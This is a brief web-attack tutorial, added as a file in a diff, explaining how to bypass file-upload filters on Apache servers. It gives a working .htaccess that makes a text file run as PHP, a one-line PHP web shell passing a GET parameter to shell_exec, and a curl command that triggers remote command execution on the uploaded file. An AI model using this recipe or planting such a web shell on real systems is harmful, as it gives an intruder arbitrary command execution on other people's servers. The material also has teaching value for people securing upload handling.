@@ -1,0 +1,48 @@
+We'll see how to bypass file upload restriction by uploading .htaccess file. (only works on apache)
+
+
+I. Context :
+
+Developers always (or should always lol) setup restrictions regarding files upload in their web application.
+If the developer is lazy or is just not informed about some file upload flaws, it can lead to serious damages.
+In most of day-today web-apps, uploaded files are mainly filtered by its extension or its content-type, for example,
+if you should upload image file for an avatar system, developers filter the entry file and accept only image files, thus
+restrict all others file type.
+But in some cases, they filter the uploaded file by only restricting few extensions such as .php, .html, .js, .java etc.
+Although it can be useful because it permits the user to upload a large panel of files, it is still very dangerous.
+
+
+
+II. Exploitation :
+
+In this case, imagine that the developer of a random web-app add a forum with a cool feature : share and upload files.
+In the case of his http server is apache, we potentially could exploit the file entry by uploading a specific .htaccess
+apache config file which rewrites rules in the upload folder.
+
+First, we need to add some content in our htaccess file that permits us to bypass restriction.
+
+Example under php7 (.htaccess) :
+
+Options All +Indexes
+
+<IfModule mod_php7.c>
+    php_flag engine on
+</IfModule>
+
+<FilesMatch "rce.txt">
+    SetHandler  application/x-httpd-php
+</FilesMatch>
+
+
+In this example, we said that the rce.txt file should be executed as a php file despite it is a text file.
+
+Then create a rce.txt file that can take GET parameters and execute it on the machine. It will create a RCE entry point
+for executing malicious shell commands.
+
+It should look like that (rce.txt) :
+
+<?php echo shell_exec($_GET['cmd']); ?>
+
+Now you can upload both files, and you sucessfully have a RCE !
+For instance, just curl the url with a random command :
+    `curl http://web-app/uploads/rce.txt?cmd=pwd`
